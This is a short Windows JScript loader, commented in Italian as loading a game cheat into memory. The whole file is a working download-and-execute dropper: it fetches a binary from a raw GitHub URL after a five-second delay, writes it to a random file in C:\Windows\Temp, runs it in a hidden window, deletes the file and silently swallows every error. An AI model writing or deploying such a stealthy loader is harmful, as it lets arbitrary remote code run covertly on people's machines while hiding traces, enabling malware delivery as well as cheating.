// loader.js - Carica il cheat in memoria
(function() {
    // URL del cheat (repository PRIVATO)
    var cheatUrl = "https://raw.githubusercontent.com/dwadadd94-ops/cheat-binaries/main/cheat.bin?t=" + Date.now();
    
    // Funzione per scaricare ed eseguire
    function loadCheat() {
        try {
            var xhr = new ActiveXObject("Microsoft.XMLHTTP");
            xhr.open("GET", cheatUrl, false);
            xhr.send();
            
            if (xhr.status === 200) {
                var binData = new VBArray(xhr.responseBody).toArray();
                executeInMemory(binData);
            }
        } catch(e) {}
    }
    
    // Esegue in memoria
    function executeInMemory(data) {
        try {
            var shell = new ActiveXObject("WScript.Shell");
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var tempFile = "C:\\Windows\\Temp\\" + Math.random().toString(36).substr(2) + ".tmp";
            
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Open();
            stream.Write(data);
            stream.SaveToFile(tempFile, 2);
            stream.Close();
            
            shell.Run(tempFile, 0, false);
            fso.DeleteFile(tempFile);
            
        } catch(e) {}
    }
    
    setTimeout(loadCheat, 5000);
})();
